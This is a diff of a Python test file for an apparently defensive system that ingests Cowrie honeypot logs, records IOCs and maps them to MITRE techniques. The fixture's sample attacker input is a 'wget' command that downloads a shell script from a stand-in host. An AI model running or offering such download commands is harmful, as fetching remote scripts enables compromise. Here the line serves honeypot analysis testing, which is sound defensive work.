@@ -55,18 +55,22 @@ class LiveTests(unittest.TestCase):
 
                 app.state.engine = TransactionEngine()
                 try:
-                    raw = {"eventid": "cowrie.command.input", "timestamp": datetime.now(timezone.utc).isoformat(), "session": "test-" + uuid4().hex, "src_ip": "198.51.100.23", "src_port": 51515, "dst_port": 2222, "input": "wget http://example.org/a.sh"}
+                    raw = {"eventid": "cowrie.command.input", "timestamp": datetime.now(timezone.utc).isoformat(), "session": "test-" + uuid4().hex, "src_ip": "198.51.100.23", "src_port": 51515, "dst_port": 2222, "input": "wget http://files.corp.local/a.sh"}
                     content = (json.dumps(raw) + "\nnot-json\n").encode()
                     results = [client.post("/api/ingesta/cowrie", files={"file": ("cowrie.json", content)}).json() for _ in range(2)]
                     self.assertEqual(results[0]["insertados"], 1)
                     self.assertEqual(results[1]["duplicados"], 1)
                     self.assertEqual(len(results[0]["errores"]), 1)
+                    ioc, observation = (app.state.tables[name] for name in ("ioc", "observacion_ioc"))
+                    self.assertEqual(connection.scalar(select(func.count()).select_from(
+                        observation.join(ioc, observation.c.id_ioc == ioc.c.id_ioc)
+                    ).where(ioc.c.valor == "http://files.corp.local/a.sh")), 1)
                     session = app.state.tables["sesion"]
                     event = app.state.tables["evento"]
                     session_id = connection.scalar(select(session.c.id_sesion).where(session.c.cowrie_session_id == raw["session"]))
                     self.assertIsNotNone(session_id)
                     self.assertEqual(connection.scalar(select(func.count()).where(event.c.id_sesion == session_id)), 1)
-                    result = AnalysisResult(resumen="Comando de descarga observado", acciones=[Finding(tipo="comando", descripcion="Descarga mediante shell", confianza=0.9, eventos=[connection.scalar(select(event.c.id_evento).where(event.c.id_sesion == session_id))], iocs=[IocProposal(tipo="URL", valor="http://example.org/a.sh", evento=connection.scalar(select(event.c.id_evento).where(event.c.id_sesion == session_id)))], mitre=[MitreProposal(codigo="T1059.004", codigo_tactica="TA0002", justificacion="Orden de descarga escrita en la shell emulada de Cowrie", limitaciones=["No demuestra ejecucion en el Ubuntu anfitrion"], confianza=0.7)])])
+                    result = AnalysisResult(resumen="Comando de descarga observado", acciones=[Finding(tipo="comando", descripcion="Descarga mediante shell", confianza=0.9, eventos=[connection.scalar(select(event.c.id_evento).where(event.c.id_sesion == session_id))], iocs=[IocProposal(tipo="URL", valor="http://files.corp.local/a.sh", evento=connection.scalar(select(event.c.id_evento).where(event.c.id_sesion == session_id)))], mitre=[MitreProposal(codigo="T1059.004", codigo_tactica="TA0002", justificacion="Orden de descarga escrita en la shell emulada de Cowrie", limitaciones=["No demuestra ejecucion en el Ubuntu anfitrion"], confianza=0.7)])])
                     with patch.dict("os.environ", {"LLM_MODEL": "test-provider-model", "LLM_PROVIDER": "test"}), patch("backend.routes.real_result", return_value=result):
                         analysis = client.post(f"/api/sesiones/{session_id}/analizar")
                     self.assertEqual(analysis.status_code, 200)
@@ -138,7 +142,7 @@ class LiveTests(unittest.TestCase):
                     self.assertFalse(retried.json()["reutilizado"])
                     self.assertNotEqual(retried.json()["id_analisis"], analysis.json()["id_analisis"])
                     self.assertEqual(client.get(f"/api/sesiones/{session_id}").json()["estado_analisis"], "analizada")
-                    self.assertEqual(connection.scalar(select(func.count()).select_from(app.state.tables["ioc"]).where(app.state.tables["ioc"].c.valor == "http://example.org/a.sh")), 1)
+                    self.assertEqual(connection.scalar(select(func.count()).select_from(app.state.tables["ioc"]).where(app.state.tables["ioc"].c.valor == "http://files.corp.local/a.sh")), 1)
 
                     # A second request cannot start while a current attempt is in progress.
                     model_id = connection.scalar(select(analysis_t.c.id_modelo).where(analysis_t.c.id_analisis == failed_id))
